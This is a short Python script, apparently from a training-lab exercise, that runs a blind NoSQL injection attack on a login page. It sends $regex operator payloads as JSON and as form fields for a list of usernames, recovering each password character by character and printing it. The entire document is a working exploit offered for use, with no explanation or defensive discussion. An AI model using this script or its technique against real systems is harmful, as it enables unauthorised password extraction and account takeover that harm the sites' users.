#!/usr/bin/env python3
"""Quick NoSQL password enumerator for Task 7"""
import requests, string, sys

URL = "http://web0x01.hbtn/a3/nosql_injection"
USERS = ["abdou", "dexter", "elon-musk", "foued", "hugo", "ismail", "jeremy", "maroua", "yosri"]
CHARS = string.ascii_lowercase + string.digits

def try_regex(user, pattern):
    # Try JSON
    try:
        r = requests.post(URL, json={"username": user, "password": {"$regex": pattern}},
                          allow_redirects=False, timeout=5)
        if r.status_code == 302:
            return True
        if "invalid" not in r.text.lower() and len(r.text) > 100:
            return True
    except: pass
    # Try form
    try:
        r = requests.post(URL, data={"username": user, "password[$regex]": pattern},
                          allow_redirects=False, timeout=5)
        if r.status_code == 302:
            return True
        if "invalid" not in r.text.lower() and len(r.text) > 100:
            return True
    except: pass
    return False

for user in USERS:
    pwd = ""
    print(f"\n[*] {user}: ", end="", flush=True)
    while True:
        found = False
        for c in CHARS:
            pat = f"^{pwd}{c}.*"
            if try_regex(user, pat):
                pwd += c
                print(c, end="", flush=True)
                found = True
                break
        if not found:
            print(f"\n  -> Password: {pwd}")
            break
